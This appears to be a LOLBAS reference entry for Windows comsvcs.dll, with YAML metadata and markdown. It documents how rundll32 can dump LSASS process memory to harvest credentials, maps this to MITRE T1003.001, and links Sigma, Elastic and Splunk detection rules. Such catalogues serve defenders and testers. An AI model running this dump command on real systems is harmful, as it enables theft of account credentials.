---
Acknowledgement:
- Person: mod
Author: LOLBAS Team
Code_Sample:
- Code: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
Commands:
- Category: Dump
  Command: rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin
    full
  Description: Calls the MiniDump exported function of comsvcs.dll, which in turns
    calls MiniDumpWriteDump.
  MitreID: T1003.001
  OperatingSystem: Windows 10, Windows 11
  Privileges: SYSTEM
  Usecase: Dump Lsass.exe process memory to retrieve credentials.
Created: 2019-08-30
Description: COM+ Services
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_rundll32_process_dump_via_comsvcs.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_access/proc_access_win_lsass_dump_comsvcs_dll.yml
- Elastic: https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml
- Splunk: https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/dump_lsass_via_comsvcs_dll.yml
Full_Path:
- Path: c:\windows\system32\comsvcs.dll
Name: Comsvcs.dll
Resources:
- Link: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
mitre_data:
  technique_ids:
  - T1003.001
tags:
- lolbas/oslibraries
---

# Comsvcs.dll

COM+ Services

# Path(s)

- `c:\windows\system32\comsvcs.dll`

# Dump Commands

Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump.

```batch
rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full
```

- **Usecase:** Dump Lsass.exe process memory to retrieve credentials.
- **Privileges Required:** SYSTEM
- **MitreID:** `T1003.001`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
# Acknowledgements

- LOLBAS Team (Authored, 2019-08-30)
- mod